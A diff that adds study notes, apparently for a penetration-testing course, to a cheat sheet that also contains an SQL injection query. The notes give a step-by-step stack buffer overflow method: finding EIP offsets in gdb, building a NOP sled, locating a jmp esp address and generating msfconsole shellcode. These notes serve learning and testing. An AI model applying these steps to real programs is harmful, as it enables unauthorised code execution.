@@ -282,6 +282,62 @@ UNION SELECT TABLE_CATALOg,TABLE_SCHEMA,TABLE_NAME FROM information.schema.table
 
 ```
 
+# Post exploitation 
+## Common Terms 
+```
+* Stack -> Contigous section of memory used for passing arguements 
+* 
+```
+## Bufer Overflow Defenses  
+```
+* Non excutable 
+* Addresss Apce Layout Randomization (ASLR) 
+* Dat aExcution Prevention (DEP) 
+* Stack canaries
+* Position Indeendent Excutable (PIE)
+```
+
+## Technical Help
+```
+* IDA, GHIDRA 
+* GDB, MONA,IMMUNITY 
+* BASH, PYTHON
+```
+Check for arugments -> ./exe <<<$(echo "AAAAAAAAAAAAAAAAA"
+Enter gdb 
+bufer = website bufer //https://wiremask.eu/tools/buffer-overflow-pattern-generator/
+(in gdb) run <<<$(./bufff.py) 
+cp eip hex value, insert into websire, click outside box. umber given is yourexact buffer
+creat nop sled -> nop = "\x90" * 15
+env - gdb "exe name" 
+show env
+unset env LINES
+unset env COLUMNS
+run the program 
+Crash the program first before running info proc map in GDB 
+Run find to find jump esp -> find /b 0xf7de1000, 0xffffe000 0xff, 0xe4 # beggining hex after heap line, last hex value in stack line
+copy and paste first 4 addresses after running find command 
+convert from big endian to little endian 
+After converting replace eip with first converted memory location 
+
+Msfconsole shell code: 
+msfdb init -> initialze database 
+use payload/linux/x86/exec
+show options
+set CMD whoami
+generate -b "\x00" -f python
+copy shell code into script
+add (+buf into print statment) 
+
+
+
+
+
+
+
+
+
+
 
 
 
